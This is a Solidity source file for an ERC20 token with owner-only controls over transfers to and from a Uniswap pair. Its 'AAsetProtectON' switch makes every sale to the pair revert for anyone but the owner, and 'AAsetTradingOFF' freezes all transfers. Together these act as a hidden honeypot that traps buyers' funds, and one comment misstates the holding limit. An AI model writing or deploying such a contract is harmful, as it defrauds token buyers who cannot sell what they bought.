// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/utils/Context.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Token is ERC20, Ownable {

    bool public IS_TRADING_ON = true;
    bool public IS_PROTECT_ON = false;
    uint256 public TOTAL_SUPPLY = 100 * 10**12 * 10**18; // (default) 100 trillions
    uint256 public MAX_HOLDING_PERCENT = 2;  // 5% => 5 trillion
    address public uniswapV2Pair;

    constructor( string memory name, string memory symbol, uint256 initialSupply
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        TOTAL_SUPPLY = initialSupply;
    }

    // Set the address of the Uniswap V2 pair.
    function setLiquidity(address _uniswapV2Pair) external onlyOwner { uniswapV2Pair = _uniswapV2Pair; }
    function AAsetProtectON() external onlyOwner { IS_PROTECT_ON = true; }
    function AAsetTradingOFF() external onlyOwner { IS_TRADING_ON = false; }

    function setConfig(uint256 _Max_Holding_Percent) external onlyOwner { MAX_HOLDING_PERCENT = _Max_Holding_Percent; }
    function setProtectOFF() external onlyOwner { IS_PROTECT_ON = false; }
    function setTradingON() external onlyOwner { IS_TRADING_ON = true; }

    // Check if a transfer should be allowed.
    function _beforeTokenTransfer(address from, address to, uint256 amount) override internal virtual {
        // Check if trading is ON.
        require(IS_TRADING_ON, "Waiting");
        // Check if the Uniswap V2 pair has been set.
        if (uniswapV2Pair == address(0)) {
            require(from == owner() || to == owner(), "Liquidity LP is not defined yet");
            return;
        }
        if (to == uniswapV2Pair && from != owner() && IS_PROTECT_ON) { require(false, "protected"); }
        if (from == uniswapV2Pair && to != owner() && from != owner()) {
            // Calculate the maximum holding amount.
            uint256 maxHoldingAmount = (TOTAL_SUPPLY - balanceOf(address(this))) * MAX_HOLDING_PERCENT / 100;
            // Check if the transfer amount exceeds the maximum holding percentage.
            require(super.balanceOf(to) + amount <= maxHoldingAmount, "Transfer amount exceeds max holding percentage");
        }
    }
}